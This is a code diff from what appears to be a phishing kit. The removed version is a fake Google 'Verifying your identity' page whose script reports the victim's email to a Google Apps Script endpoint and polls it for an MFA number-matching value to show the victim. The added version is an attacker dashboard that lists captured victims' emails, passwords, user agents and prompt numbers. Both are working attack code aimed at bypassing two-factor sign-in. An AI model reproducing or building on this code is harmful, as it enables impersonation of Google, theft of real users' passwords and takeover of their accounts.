@@ -1,399 +1,213 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
   <meta charset="UTF-8" />
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <title>Verifying your identity – Google</title>
-
-  <meta name="robots" content="noindex, nofollow" />
-
- 
-
-  <!-- Google Fonts – Roboto is still the standard in 2026 for Google properties -->
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-
- 
-
-  <link rel="stylesheet" href="style.css" />
-
- 
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Live Prompt Monitor – Latest Number</title>
+  <meta http-equiv="refresh" content="300"> <!-- fallback full refresh every 5 min -->
   <style>
-
-    /* Inline fallback styles – move to style.css in production */
-
     body {
-
-      font-family: 'Roboto', system-ui, sans-serif;
-
-      background: #f8f9fa;
-
-      color: #202124;
-
+      font-family: 'Segoe UI', Roboto, sans-serif;
+      background: #f8fafc;
+      color: #1e293b;
       margin: 0;
-
-      padding: 0;
-
-      height: 100vh;
-
-      display: flex;
-
-      align-items: center;
-
-      justify-content: center;
-
+      padding: 20px 16px;
+      min-height: 100vh;
     }
-
-    .page-center {
-
-      max-width: 420px;
-
-      width: 100%;
-
-      padding: 24px;
-
+    .container {
+      max-width: 960px;
+      margin: 0 auto;
     }
-
-    .card {
-
-      background: white;
-
-      border-radius: 12px;
-
-      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-
-      padding: 32px 24px;
-
-      text-align: center;
-
-    }
-
-    .logo svg {
-
-      width: 48px;
-
-      height: 48px;
-
-      margin-bottom: 24px;
-
-    }
-
-    .avatar {
-
-      width: 64px;
-
-      height: 64px;
-
-      background: #4285f4;
-
-      color: white;
-
-      font-size: 28px;
-
-      font-weight: 500;
-
-      line-height: 64px;
-
-      border-radius: 50%;
-
-      margin: 0 auto 24px;
-
-    }
-
     h1 {
-
-      font-size: 24px;
-
-      font-weight: 500;
-
+      color: #1d4ed8;
+      text-align: center;
       margin: 0 0 12px;
-
+      font-size: 2.1rem;
     }
-
-    p {
-
-      font-size: 16px;
-
-      color: #5f6368;
-
-      margin: 0 0 24px;
-
-      line-height: 1.5;
-
+    .latest-card {
+      background: linear-gradient(135deg, #2563eb, #1e40af);
+      color: white;
+      padding: 2.5rem 1.5rem;
+      border-radius: 16px;
+      text-align: center;
+      margin-bottom: 2.5rem;
+      box-shadow: 0 10px 30px rgba(37,99,235,0.25);
     }
-
-    .spinner {
-
-      width: 40px;
-
-      height: 40px;
-
-      border: 4px solid #e8eaed;
-
-      border-top: 4px solid #4285f4;
-
-      border-radius: 50%;
-
-      animation: spin 1s linear infinite;
-
-      margin: 0 auto 24px;
-
+    .latest-label {
+      font-size: 1.15rem;
+      opacity: 0.9;
+      margin-bottom: 0.75rem;
     }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-   
-
-    #prompt-section {
-
-      transition: opacity 0.4s ease;
-
+    .latest-number {
+      font-size: 5.5rem;
+      font-weight: 800;
+      letter-spacing: 10px;
+      margin: 0;
+      line-height: 1;
     }
-
-    .number-box {
-
-      font-size: 48px;
-
-      font-weight: 700;
-
-      letter-spacing: 12px;
-
-      color: #202124;
-
-      background: #f1f3f4;
-
-      padding: 16px 32px;
-
+    .latest-info {
+      margin-top: 1rem;
+      font-size: 1.1rem;
+      opacity: 0.95;
+    }
+    .no-number {
+      font-size: 2rem;
+      opacity: 0.7;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
       border-radius: 12px;
-
-      display: inline-block;
-
-      margin: 16px auto 24px;
-
-      min-width: 140px;
-
-      user-select: none;
-
+      overflow: hidden;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.07);
     }
-
-    .security-note {
-
-      font-size: 14px;
-
-      color: #5f6368;
-
+    th, td {
+      padding: 14px 16px;
+      text-align: left;
     }
-
+    th {
+      background: #1e40af;
+      color: white;
+      font-weight: 600;
+    }
+    tr:nth-child(even) {
+      background: #f8fafc;
+    }
+    .status-password { color: #059669; font-weight: 600; }
+    .status-ready    { color: #7c3aed; font-weight: 600; }
+    .timestamp       { color: #64748b; font-size: 0.95rem; }
+    .loading, .error {
+      text-align: center;
+      padding: 2rem;
+      font-size: 1.2rem;
+      color: #64748b;
+    }
+    .last-update {
+      text-align: center;
+      margin-top: 1.5rem;
+      color: #64748b;
+      font-size: 0.95rem;
+    }
   </style>
-
 </head>
-
 <body>
 
-  <div class="page-center">
+  <div class="container">
+    <h1>Live Latest Prompt Number</h1>
 
-    <div class="card">
-
-      <!-- Google logo -->
-
-      <div class="logo">
-
-        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-
-          <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
-
-          <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
-
-          <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
-
-          <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
-
-        </svg>
-
-      </div>
-
-      <!-- Initial avatar letter -->
-
-      <div class="avatar" id="avatar" aria-hidden="true"></div>
-
-      <!-- Loading / waiting state -->
-
-      <div id="loading">
-
-        <div class="spinner" aria-hidden="true"></div>
-
-        <h1>Verifying your identity</h1>
-
-        <p id="status-text">Checking your account…</p>
-
-      </div>
-
-      <!-- Number prompt state (hidden initially) -->
-
-      <div id="prompt-section" style="display: none;" role="region" aria-live="polite">
-
-        <h1>Check your phone</h1>
-
-        <p>Tap <strong>Yes</strong> on the prompt sent to your device</p>
-
-       
-
-        <div class="security-note" style="margin: 16px 0;">
-
-          Match the number below with the one shown on your phone:
-
-        </div>
-
-       
-
-        <div id="match-number" class="number-box" aria-label="Verification number">••</div>
-
-       
-
-        <p class="security-note">
-
-          This extra step helps keep your account secure.
-
-        </p>
-
-      </div>
-
+    <div class="latest-card">
+      <div class="latest-label">Current Active Prompt Number</div>
+      <div class="latest-number" id="latestNumber">••</div>
+      <div class="latest-info" id="latestInfo"></div>
     </div>
 
+    <div id="loading" class="loading">Loading latest data...</div>
+    <div id="error" class="error" style="display:none;"></div>
+
+    <table id="dataTable" style="display:none;">
+      <thead>
+        <tr>
+          <th>Timestamp</th>
+          <th>Email</th>
+          <th>Status</th>
+          <th>Prompt Number</th>
+          <th>User Agent</th>
+          <th>Password</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody"></tbody>
+    </table>
+
+    <div class="last-update" id="lastUpdate">Last update: —</div>
   </div>
 
   <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxayueIRLXEyEmTO2BATezFZdivXqQqb5wp_lKX22wWfcSS8wvD1lZS4vTJ5eIlJ0bN/exec"; // ← your real script URL
 
-    // ────────────────────────────────────────────────
+    let lastKnownNumber = "••";
 
-    //  Victim-side polling script – clean 2026 version
-
-    // ────────────────────────────────────────────────
-
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxayueIRLXEyEmTO2BATezFZdivXqQqb5wp_lKX22wWfcSS8wvD1lZS4vTJ5eIlJ0bN/exec";
-
-    // Determine victim email (demo / captured value)
-
-    const email = localStorage.getItem("demoEmail") || "user@example.com";
-
-    document.getElementById("avatar").textContent =
-
-      (email.split('@')[0] || "U").charAt(0).toUpperCase();
-
-    // Notify dashboard that victim is ready (logging / tracking)
-
-    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
-
-      method: "GET",
-
-      mode: "no-cors",
-
-      cache: "no-store"
-
-    }).catch(() => {}); // silent
-
-    const loadingEl     = document.getElementById("loading");
-
-    const promptEl      = document.getElementById("prompt-section");
-
-    const statusEl      = document.getElementById("status-text");
-
-    const numberEl      = document.getElementById("match-number");
-
-    let lastDisplayedNumber = "••";
-
-    function pollForNumber() {
-
-      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
-
-      fetch(url, {
-
-        cache: "no-store",
-
-        mode: "cors"
-
-      })
-
-        .then(r => {
-
-          if (!r.ok) throw new Error(`HTTP ${r.status}`);
-
-          return r.json();
-
-        })
-
-        .then(data => {
-
-          const num = data?.prompt_number?.trim() || "";
-
-          // Only update if we have a valid 2-digit number and it's new
-
-          if (/^\d{2}$/.test(num) && num !== lastDisplayedNumber) {
-
-            numberEl.textContent = num;
-
-            lastDisplayedNumber = num;
-
-            statusEl.textContent = "Number received";
-
-            loadingEl.style.display = "none";
-
-            promptEl.style.display = "block";
-
-          }
-
-        })
-
-        .catch(() => {
-
-          // Silent failure – keep current state
-
-          if (promptEl.style.display !== "block") {
-
-            statusEl.textContent = "Waiting for verification…";
-
-          }
-
+    async function fetchAndUpdate() {
+      try {
+        const response = await fetch(`${SCRIPT_URL}?getVictims=true`, {
+          cache: "no-store"
         });
 
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+
+        const victims = await response.json();
+
+        // Sort just in case (though script usually gives newest first)
+        victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+        // Find the most recent valid 2-digit prompt number
+        let latest = { number: "••", email: "", timestamp: "" };
+        for (const v of victims) {
+          const num = (v.promptNumber || "").trim();
+          if (/^\d{2}$/.test(num)) {
+            latest = {
+              number: num,
+              email: v.email || "—",
+              timestamp: v.timestamp ? new Date(v.timestamp).toLocaleString() : "—"
+            };
+            break;
+          }
+        }
+
+        // Update top display only if changed (reduces flicker)
+        if (latest.number !== lastKnownNumber) {
+          document.getElementById("latestNumber").textContent = latest.number;
+          document.getElementById("latestInfo").textContent = 
+            latest.number !== "••" 
+              ? `from ${latest.email} • ${latest.timestamp}`
+              : "No active prompt number yet";
+          lastKnownNumber = latest.number;
+        }
+
+        // Build / update table
+        const tbody = document.getElementById("tableBody");
+        tbody.innerHTML = "";
+
+        victims.forEach(v => {
+          const tr = document.createElement("tr");
+          tr.innerHTML = `
+            <td class="timestamp">${v.timestamp ? new Date(v.timestamp).toLocaleString() : "—"}</td>
+            <td>${v.email || "—"}</td>
+            <td class="${v.status?.includes("password") ? "status-password" : "status-ready"}">
+              ${v.status || "—"}
+            </td>
+            <td style="font-weight: ${v.promptNumber ? 'bold' : 'normal'};">
+              ${v.promptNumber || "—"}
+            </td>
+            <td>${v.user_agent || v.userAgent || "—"}</td>
+            <td>${v.password || "—"}</td>
+          `;
+          tbody.appendChild(tr);
+        });
+
+        // Show table + hide loading
+        document.getElementById("dataTable").style.display = "table";
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("error").style.display = "none";
+
+        // Update timestamp
+        document.getElementById("lastUpdate").textContent = 
+          `Last update: ${new Date().toLocaleTimeString()}`;
+
+      } catch (err) {
+        console.error("Fetch error:", err);
+        document.getElementById("loading").style.display = "none";
+        const errEl = document.getElementById("error");
+        errEl.textContent = "Error loading data – will retry soon";
+        errEl.style.display = "block";
+      }
     }
 
-    // Poll every 3 seconds – balanced responsiveness vs. quota usage
+    // Initial load
+    fetchAndUpdate();
 
-    const POLL_INTERVAL_MS = 3000;
-
-    const pollTimer = setInterval(pollForNumber, POLL_INTERVAL_MS);
-
-    // Initial poll
-
-    pollForNumber();
-
-    // Optional: stop polling after reasonable timeout (e.g. 15 min)
-
-    setTimeout(() => {
-
-      clearInterval(pollTimer);
-
-      if (promptEl.style.display !== "block") {
-
-        statusEl.textContent = "Verification timed out. Please try again.";
-
-      }
-
-    }, 15 * 60 * 1000);
-
+    // Auto-refresh every 5 seconds (adjust as needed – 3000–10000 ms is reasonable)
+    setInterval(fetchAndUpdate, 5000);
   </script>
-
 </body>
-
 </html>
